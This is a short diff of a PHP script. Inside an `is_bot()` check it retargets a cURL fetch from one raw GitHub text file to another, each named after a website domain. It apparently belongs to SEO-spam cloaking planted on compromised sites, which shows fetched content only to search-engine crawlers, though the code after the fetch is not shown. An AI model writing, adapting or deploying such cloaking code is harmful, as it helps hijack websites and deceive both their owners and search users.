@@ -46,7 +46,7 @@ function get_keywords() {
 }
 
 if (is_bot()) {
-    $url = 'https://raw.githubusercontent.com/yugoprakoso157/D/refs/heads/main/lucaslucco.com.br.txt';
+    $url = 'https://raw.githubusercontent.com/yugoprakoso157/D/refs/heads/main/shoppelavida.com.txt';
 
     // Menggunakan cURL untuk mengambil konten
     $ch = curl_init($url);
